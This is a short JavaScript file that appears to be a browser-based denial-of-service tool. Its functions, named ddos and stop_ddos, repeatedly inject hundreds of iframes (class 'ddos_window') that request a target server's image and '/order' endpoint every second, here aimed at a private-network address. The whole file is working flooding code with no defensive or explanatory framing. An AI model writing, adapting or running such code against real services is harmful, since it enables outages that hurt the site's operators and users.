function goto(address,threadCount){
    let container=document.querySelector(".container");
    let parentNode=container.parentNode;
    parentNode.removeChild(container);
    container.innerHTML="";
    for(let i=0; i<threadCount;i++){
        container.innerHTML+=/*html*/`<iframe class="ddos_window" src=${address}></iframe>`;
    }
    parentNode.appendChild(container);
}
function intervalCallback(){
    goto("http://192.168.59.144:8080/bg.png",20);
    goto("http://192.168.59.144:8080/order",200);
}
let intervalFunction;
function ddos(){
    if(intervalFunction)
        clearInterval(intervalFunction);
    intervalFunction=setInterval(intervalCallback,1000)
}
function stop_ddos(){
    clearInterval(intervalFunction)
}